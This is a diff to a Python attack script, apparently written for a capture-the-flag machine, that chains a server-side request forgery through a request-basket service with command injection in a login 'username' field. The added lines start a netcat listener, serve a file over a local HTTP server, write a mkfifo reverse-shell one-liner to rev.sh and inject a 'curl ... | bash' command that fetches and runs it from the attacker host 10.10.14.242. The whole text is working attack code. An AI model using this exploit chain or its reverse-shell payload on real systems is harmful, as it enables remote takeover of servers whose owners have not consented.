@@ -2,7 +2,8 @@ import string
 import random
 import requests
 import os
-from bs4 import BeautifulSoup
+import threading
+import time
 
 
 def printResponse(respuesta):
@@ -25,6 +26,8 @@ payload = "http://127.0.0.1:80/"  # According to nmap port 80 is filtered. That 
 
 range_basket_name = 10
 
+stop_thread = False
+
 # choose from all lowercase letter
 letters = string.ascii_lowercase
 basket_name = ''.join(random.choice(letters) for i in range(range_basket_name))
@@ -46,8 +49,25 @@ if r.status_code == 201:
 
     if r.status_code == 200:
         print("Web service found!!! With a request from inside the machine.")
+        
+        nc_thread = threading.Thread(target=os.system, args=[f"nc -lvnp 2314"])
+        nc_thread.start()
 
-        os.system(f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://10.10.14.242:8000/`'")
+        nc_thread.join(timeout=1)
+        
+        # server_thread = threading.Thread(target=os.system, args=[f"python -m http.server {8003}"])
+        server_thread = threading.Thread(target=os.system, args=[f"python -m http.server {8003}"])
+        server_thread.start()
+        
+        time.sleep(1)
+        
+        os.system("echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.242 2314 >/tmp/f' > rev.sh | chmod +x rev.sh")
+        attack_thread = threading.Thread(target=os.system, args=[f"curl {url_vulnerable_service}{basket_name}/login --data 'username=;`curl http://10.10.14.242:8003/rev.sh | bash`'"])
+        attack_thread.start()
+
+        attack_thread.join(timeout=10)
+
+        os.system("kill $(lsof -i :8003 | grep LISTEN | awk '{print $2}')")
     else:
         print("The port 80 is closed.")
 else:
